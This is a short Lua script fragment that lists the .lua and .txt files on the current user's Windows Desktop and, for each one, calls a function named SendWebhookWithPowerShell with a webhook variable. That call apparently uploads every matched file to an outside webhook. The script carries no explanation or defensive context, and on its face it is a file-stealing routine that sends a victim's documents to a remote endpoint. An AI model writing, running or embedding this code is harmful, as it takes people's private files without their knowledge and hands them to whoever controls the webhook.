function getAllFiles(directory)
    files = {}
    handle = io.popen('dir "'..directory..'" /b /a-d')
    for filename in handle:lines() do
        if filename:match("%.lua$") or filename:match("%.txt$") then
            table.insert(files, directory.."\\"..filename)
        end
    end
    handle:close()
    return files
end

desktopFiles = getAllFiles(os.getenv("USERPROFILE").."\\Desktop")

for _, file in ipairs(desktopFiles) do
    SendWebhookWithPowerShell(xwebhook, file)
end
